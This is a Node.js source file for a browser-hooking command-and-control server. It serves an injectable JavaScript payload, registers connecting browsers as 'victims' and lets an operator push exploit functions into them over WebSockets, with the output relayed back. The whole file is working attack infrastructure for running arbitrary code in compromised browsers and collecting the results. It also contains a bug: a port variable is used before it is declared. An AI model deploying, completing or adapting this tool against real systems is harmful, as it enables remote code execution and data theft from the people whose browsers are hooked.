const http = require('http')
const ws = require('ws')

const config = require('./config')
const client = require('./client')
let exploits = require('./exploits')

const victims = {}
const cmds = {
    'help': help,
    'list': list,
    'exploit': exploit,
    'addsploits': addsploits
}

function help(conn) {
    conn.send(Object.keys(cmds).join('|'))
}

function list(conn, args) {
    const listables = ['victims', 'exploits']
    if(args.length < 1) {
        conn.send('Usage: list [' + listables.join('|') + ']')
    }
    switch(args[0]) {
        case 'victims':
            conn.send('' + Object.keys(victims))
            break
        case 'exploits':
            conn.send('' + Object.keys(exploits))
            break
        default:
            conn.send('The argument must be either "' + listables.join('" or "') + '"')
            break
    }
}

function exploit(conn, args) {
    if(args.length < 2) {
        conn.send('Usage: exploit who what\r\nTo do what to who')
        return
    }
    const who = args[0]
    if(victims[who] == undefined || !Object.keys(victims).includes(who)) {
        conn.send(who + ' is not a victim')
        return
    }
    const what = args[1]
    if(exploits[what] == undefined || !Object.keys(exploits).includes(what)) {
        conn.send(what + ' is not an exploit')
        return
    }
    const vic_conn = victims[who]
    vic_conn.on('message', data => conn.send(data))
    vic_conn.send('(' + exploits[what] + ')()')
    console.log('Sent ' + what + ' to ' + who)
}

function addsploits(conn, args) {
    if(args.length < 1) {
        conn.send('Usage: import package')
        return
    }
    try {
        const dir_trav = ['..']
        if(dir_trav.some(s => args[0].includes(s))) {
            conn.send('You can only import sploits from child directories')
            return
        }
        exploits = {...exploits, ...require('./exploits/' + args[0])}
        conn.send('' + args[0] + ' was successfully added')
    } catch {
        conn.send('' + args[0] + ' could not be added')
    }
}

function handle_cmd(conn, cmd, args) {
    if(undefined === cmds[cmd]) {
        conn.send('Implemented commands: ' + Object.keys(cmds).join(','))
    } else {
        cmds[cmd](conn, args)
    }
}

function main() {
    const CMD_PORT = config.cmd_port || 1337
    new ws.Server({ port: CMD_PORT })
    .on('connection', conn => {
        conn.on('message', data => {
            const cmdarr = data.split(' ')
            const cmd = cmdarr[0]
            const args = cmdarr.slice(1)
            handle_cmd(conn, cmd, args)
        })
    })
    console.log('Command server running on port ' + CMD_PORT)

    const CLIENT_PORT = config.client_port || 8080
    http.createServer((req, res) => {
        const HOST = config.host || 'localhost'
        const server_url = '"ws://' + HOST + ':' + EXPLOIT_PORT + '"'
        let client_payload = '(' + client + ')()'
        client_payload = client_payload.replace('$$SERVER_URL$$', server_url)
        res.end(client_payload)
    }).listen(CLIENT_PORT)
    console.log('Payload server running on port ' + CLIENT_PORT)

    const EXPLOIT_PORT = config.exploit_port || 8000
    new ws.Server({ port: EXPLOIT_PORT })
    .on('connection', (conn, req) => {
        const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
        // TODO Include the victim's origin
        victims[vic_name] = conn
        console.log('New victim ' + vic_name)
        // TODO Implement the ability to automatically run commands on connect
        conn.on('close', () => delete victims[vic_name])
    })
    console.log('Exploit server running on port ' + EXPLOIT_PORT)
}

main()
